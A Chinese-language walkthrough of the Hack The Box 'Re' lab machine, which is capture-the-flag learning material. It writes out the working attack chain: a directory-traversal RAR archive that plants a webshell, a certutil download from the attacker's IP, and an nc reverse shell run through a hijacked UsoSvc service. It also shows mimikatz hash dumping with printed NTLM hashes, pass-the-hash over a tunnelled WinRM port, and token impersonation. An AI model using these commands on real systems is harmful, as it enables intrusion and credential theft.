### 优化后的文本

#### 脚本分析与漏洞利用

在脚本的最后部分，通过检测的 ODS 文件会被打包，并使用 MD5 哈希值作为文件名，压缩格式为 RAR。提到 RAR 格式，很容易联想到去年爆出的目录穿越漏洞（CVE-2018-20250），具体细节可以参考相关文章。

检查 `Program Files` 目录后发现，靶机没有安装 WinRAR，但发现了 PeaZip 这个软件。PeaZip 存在一个命令注入漏洞，但靶机上安装的版本不在受影响范围内：
```plaintext
VersionInfo       : File:             C:\Program Files\PeaZip\peazip.exe
                    InternalName:     PeaZip
                    OriginalFilename: PeaZip
                    FileVersion:      6.7.0
                    FileDescription:  PeaZip, file and archive manager
                    Product:          PeaZip
                    ProductVersion:   6.7.0
                    Debug:            False
                    Patched:          False
                    PreRelease:       False
                    PrivateBuild:     False
                    SpecialBuild:     False
                    Language:         English (United States)
```

继续检查 PeaZip 的目录，发现该软件同样包含 `UNACEV2.DLL` 文件，理论上 WinRAR 的目录穿越漏洞也适用于此软件。
```plaintext
Directory: C:\Program Files\PeaZip\resunace
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/1/2007   2:56 PM            601 note_install.txt
-a----        1/15/2010  12:29 PM           1304 peazip-unace-WIN64.iss
-a----        1/15/2010  12:27 PM           1269 peazip-unace-WINDOWS.iss
-a----         6/2/2007   9:41 AM          27136 unace.exe
-a----        8/26/2005   2:50 AM          77312 UNACEV2.DLL
-a----        3/20/2019   2:12 PM           1565 unins000.dat
-a----        3/20/2019   2:11 PM         707354 unins000.exe
```

#### 生成和上传 RAR 文件

使用以下脚本生成 RAR 文件：
```python
# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to run
evil_filename = "shell.exe"
# The decompression path you want, such shown below
target_filename = r"C:\\C:\\C:\\../../../../../../../tmp/kira.exe"
```

将生成的文件放入 `C:\Users\luke\Documents\ods`，并修改文件名为 `md5.rar`：
```powershell
certutil.exe -urlcache -split -f http://10.10.14.220:23333/test.rar C:\Users\luke\Documents\odsee6ea50adb1d71c85d28d2c56c13e166.rar
```

查看 `tmp` 目录，确认文件已成功写入：
```plaintext
Directory: C:\tmp
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/1/2020   6:54 PM           2109 kira.exe
```

#### 权限检查与利用

需要考虑的是将什么文件写入哪个目录。一般思路是将后门程序写入用户的启动项，但由于 HTB 靶机不会重启只会重置，这个方法行不通。检查写入文件的权限，发现所有者是另一个用户 `cam`，猜测执行解压脚本的用户也是 `cam`。
```powershell
get-acl kira.exe | format-list
Path   : Microsoft.PowerShell.CoreFileSystem::C:\tmp\kira.exe
Owner  : RE\cam
Group  : RE\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         RE\cam Allow  FullControl
Audit  :
Sddl   : O:S-1-5-21-311800348-2366743891-1978325779-1002G:S-1-5-21-311800348-2366743891-1978325779-513D:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;FA;;;S-1-5-21-311800348-2366743891-1978325779-1002)
```

回想起有 Web 服务，尝试访问 Web 目录，发现当前用户无权限，但 `cam` 可能有权限。
```plaintext
Directory: C:\inetpub\wwwroot
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2020   6:54 PM                blog
d-----        3/27/2019   2:10 PM                ip
d-----        6/18/2019  10:18 PM                re
C:\inetpub\wwwroot\blog
Access is denied.
```

在网上找到一个 ASPX 大马，修改生成 RAR 的脚本：
```python
# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to run
evil_filename = "kira.aspx"
# The decompression path you want, such shown below
target_filename = r"C:\\C:\\C:\\../../../../../../../inetpub/wwwroot/blog/kira.aspx"
```

成功获取到一个 WebShell！分别将 WebShell 写入 `ip` 和 `re` 目录，发现有不同的用户权限，其中 `iis apppool\re` 可以打开根目录 `proj_drop`。
```powershell
PS C:> get-acl proj_drop | format-list
Path   : Microsoft.PowerShell.CoreFileSystem::C:\proj_drop
Owner  : BUILTIN\Administrators
Group  : RE\None
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RE\coby Allow  Modify, Synchronize
         RE\cam Allow  FullControl
         IIS APPPOOL\re Allow  ReadAndExecute, Synchronize
         IIS APPPOOL\re Allow  Write, Synchronize
```

`proj_drop` 目录比较可疑，放入文件会消失，可能触发特定漏洞。重新查看题目的博客，寻找提示。

#### 其他端口和服务

简单查看后发现作者未能成功利用漏洞，且环境中未开放 18001 端口。查看活动连接：
```plaintext
Active Connections
  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       816
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       448
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       312
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1656
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       596
```

#### UsoSvc 提权

思路断了，使用 `PowerUp.ps1` 辅助脚本进行检测。
```powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

脚本提示服务权限异常：
```plaintext
[*] Checking service permissions...
ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```

通过修改 `UsoSvc` 服务的 `binPath` 并重启服务来执行命令：
```powershell
PS C:> sc.exe stop UsoSvc
PS C:> sc.exe config usosvc binPath="C:\Windows\System32\spooldrivers\color\nc.exe 10.10.14.220 23336 -e cmd.exe"
PS C:> sc.exe qc usosvc
PS C:> sc.exe start UsoSvc
```

反弹 Shell 直接拿到 SYSTEM 权限，但无法打开 `root.txt`，检查权限：
```powershell
PS C:\tmp> get-acl C:\Users\Administrator\Desktop\root.txt | format-list
Path   : Microsoft.PowerShell.CoreFileSystem::C:\Users\Administrator\Desktop\root.txt
Owner  : RE\coby
Group  : RE\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         RE\Administrator Allow  FullControl
         RE\coby Allow  FullControl
```

尝试修改权限后仍然无法打开文件：
```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
Access is denied.
cacls C:\Users\Administrator\Desktop\root.txt /e /p system:f
```

#### mimikatz 和 incognito 利用

注意到 `Administrator` 和 `coby` 都可以打开 `root.txt`，尝试切换用户。上传 mimikatz 导出所有用户哈希：
```powershell
privilege::debug
token::elevate
lsadump::sam
```

获取到其他用户的 NTLM 哈希：
```plaintext
User : Administrator
  Hash NTLM: caf97bbc4c410103485a3cf950496493
User : coby
  Hash NTLM: fa88e03e41fdf7b707979c50d57c06cf
```

之前查看端口发现靶机开放了 5985 端口，但有防火墙。使用 ew 转发 winrm 端口到本地：
```bash
攻击端主机：
./ew_for_linux64 -s lcx_listen -l 5985 -e 23335
靶机：
ew.exe -s lcx_slave -d 10.10.14.220 -e 23335 -f 127.0.0.1 -g 5985
```

使用 `coby` 的哈希登录并读取 `root.txt`：
```bash
root@kali:~/pentest/Re# evil-winrm -i 127.0.0.1 -u coby -H fa88e03e41fdf7b707979c50d57c06cf
Evil-WinRM shell v2.1
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\coby\Documents> type C:\Users\Administrator\Desktop\root.txt
1B4FB9xxxxxxxxxxxxxxxxxxxx8F7715D
```

#### 使用 incognito 模块

为何有权限却读不到 flag？事后请教了一位外国友人，原来是因为文件被加密（EFS）。使用 `cipher` 命令检查 `root.txt`，发现文件被加密，只有 `Administrator` 和 `coby` 可以解密。
```powershell
PS C:\Users\Administrator\Desktop> cipher /c root.txt
Listing C:\Users\Administrator\Desktop
New files added to this directory will not be encrypted.
E root.txt
  Compatibility Level:
    Windows XP/Server 2003
  Users who can decrypt:
    RE\Administrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D
    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0
  No recovery certificate found.
  Key information cannot be retrieved.
The specified file could not be decrypted.
```

使用 Metasploit 获取 SYSTEM 权限后，立即执行之前放进去的后门反弹 Shell。`meterpreter` 中的 `incognito` 模块可以进行用户切换：
```powershell
meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
Font Driver HostUMFD-0
Font Driver HostUMFD-1
IIS APPPOOLip
IIS APPPOOLre
IIS APPPOOLREblog
NT AUTHORITYIUSR
NT AUTHORITYLOCAL SERVICE
NT AUTHORITYNETWORK SERVICE
NT AUTHORITYSYSTEM
RE\cam
RE\coby
RE\luke
Window ManagerDWM-1
Impersonation Tokens Available
========================================
No tokens available
meterpreter > impersonate_token "RE\coby"
[+] Delegation token available
[+] Successfully impersonated user RE\coby
meterpreter > cat c:\users\administrator\desktop\root.txt
1B4FB9xxxxxxxxxxxxxxxxxxx8F7715D
```

至此渗透完毕：
```powershell
C:\tmp>whoami /user
USER INFORMATION
----------------    
User Name SID
======== =============================================
recoby   S-1-5-21-311800348-2366743891-1978325779-1000
```

#### 总结

这个靶机的渗透过程较为复杂，每个用户权限都有限，需要理解自动脚本的运行过程和猜测脚本效果。即使知道漏洞利用方式，也需要进一步思考如何利用。最终拿到 SYSTEM 权限后，还需进行一系列操作才能拿到 flag。